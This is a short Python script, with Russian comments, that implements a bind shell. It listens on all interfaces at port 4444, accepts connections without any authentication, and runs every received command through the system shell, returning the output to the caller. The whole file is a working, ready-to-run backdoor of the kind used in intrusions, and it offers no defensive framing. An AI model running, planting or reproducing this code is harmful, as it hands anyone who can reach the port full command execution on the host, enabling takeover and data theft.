import socket
import subprocess
import threading


def handle_client(client_socket):
    try:
        while True:
            # Получаем команду от клиента
            command = client_socket.recv(1024).decode('utf-8').strip()
            if not command:
                break

            # Выполняем команду
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = e.output

            # Отправляем вывод обратно клиенту
            client_socket.send(output + b"\n")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()


def bind_shell(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', port))
    server.listen(5)
    print(f"[*] Listening on 0.0.0.0:{port}")

    try:
        while True:
            client_socket, addr = server.accept()
            print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")

            # Запускаем обработчик клиента в отдельном потоке
            client_handler = threading.Thread(target=handle_client, args=(client_socket,))
            client_handler.start()
    except KeyboardInterrupt:
        print("\n[*] Shutting down server...")
    finally:
        server.close()


if __name__ == "__main__":
    bind_shell(4444)  # Укажите нужный порт